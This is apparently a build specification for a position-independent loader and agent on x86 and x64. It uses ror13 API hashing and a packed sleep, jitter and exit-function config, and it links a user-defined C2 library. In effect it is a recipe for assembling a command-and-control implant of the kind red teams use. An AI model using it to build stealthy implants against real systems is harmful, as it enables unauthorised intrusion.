x86:
    load "loader.x86.o"
        make pic +gofirst +optimize
    
        dfr "_resolve" "ror13"
        fixptrs "_caller"
        
        mergelib "libtcg.x86.zip"

        load $PUBKEY %PUBKEY
        pack $CONFIG "iii#v" %SLEEP %JITTER %EXITFUNC $PUBKEY
        
        push $CONFIG
            preplen
            link "config"

    load "agent.x86.o"
        make object +optimize

        exportfunc "_setup_config" "___tag_setup_config"
    
        mergelib %UDC2
        mergelib "libtcg.x86.zip"

        export
        link "agent"
    
    export

x64:
    load "loader.x64.o"
        make pic +gofirst +optimize
    
        dfr "resolve" "ror13"
        mergelib "libtcg.x64.zip"

        load $PUBKEY %PUBKEY
        pack $CONFIG "iii#v" %SLEEP %JITTER %EXITFUNC $PUBKEY
        
        push $CONFIG
            preplen
            link "config"

    load "agent.x64.o"
        make object +optimize +unwind

        exportfunc "setup_config" "__tag_setup_config"
    
        mergelib %UDC2
        mergelib "libtcg.x64.zip"

        export
        link "agent"
    
    export